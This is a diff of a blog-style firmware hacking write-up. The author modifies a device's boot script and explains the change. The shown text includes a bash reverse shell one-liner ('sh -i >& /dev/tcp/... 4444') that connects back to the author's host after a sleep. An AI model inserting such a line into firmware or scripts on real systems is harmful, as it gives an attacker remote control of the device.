@@ -301,13 +301,15 @@ fi
 
 ```
 
-While this looked a bit too easy to be true, I just added a couple of lines to the end of the file: [^15]
+While this looked a bit too easy to be true, I just added a couple of lines to the end of the file:
 ```bash
 sleep 60
 
 sh -i >& /dev/tcp/192.168.1.x/4444 0>&1
 ```
 The sleep was added since the network driver needed some time to start up.
+The second line is a reverse shell that connects to my host on port 4444, I just selected a simple one from [revshells.com](https://revshells.com). I could've been fancy with a bind shell which should be easier to deploy to other machines as well, but just used a revshell for simplicity.
+
 
 ### Putting it all together
 
@@ -317,7 +319,6 @@ So now we save the modified firmware file and zip it back up together using the 
 
 
 [^14]: [https://linuxhint.com/use-etc-rc-local-boot/](https://linuxhint.com/use-etc-rc-local-boot/)
-[^15]: I initally tested netcat reverse shells as well, but it was dumb to assume that netcat would be installed on the device. So a shell that uses the built-in `sh` shell makes more sense.
 
 #### Some specs:
 ```bash
